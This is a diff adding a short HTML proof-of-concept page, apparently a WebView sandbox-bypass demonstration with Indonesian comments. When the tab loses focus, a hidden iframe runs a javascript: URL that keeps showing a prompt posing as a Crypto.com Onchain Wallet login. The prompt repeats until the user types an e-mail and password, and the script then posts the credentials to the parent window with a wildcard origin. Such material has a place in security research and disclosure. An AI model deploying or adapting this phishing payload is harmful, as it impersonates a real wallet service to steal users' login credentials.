@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox WebView – Delayed JS</title>
+  <style>iframe{visibility:hidden;}</style>
+  <script>
+    // Saat tab kehilangan fokus, jalankan loop prompt lewat iframe
+    window.onblur = function () {
+      const code =
+        "(function(){try{"
+        + "var msg='In order to access Crypto.com Onchain Wallet\\n"
+        + "you must first login on your\\nCrypto.com Onchain Wallet.\\n\\n"
+        + "Please type your e-mail\\nand your password:';"
+        + "var v='';"
+        // ulangi jika Cancel/null/kosong/whitespace
+        + "while(v===null||v.trim()===''){"
+        + "  v=prompt(msg,'E-mail / Password.');"
+        + "}"
+        // opsional: kirim ke parent (bisa dihapus kalau tak perlu)
+        + "try{top.postMessage({creds:v},'*');}catch(e){}"
+        + "}catch(e){}})()";
+
+      document.getElementById('iframe').src = "javascript:" + code;
+    };
+  </script>
+</head>
+<body>
+  <center><h1>Click Here</h1></center>
+  <iframe id="iframe"></iframe>
+</body>
+</html>
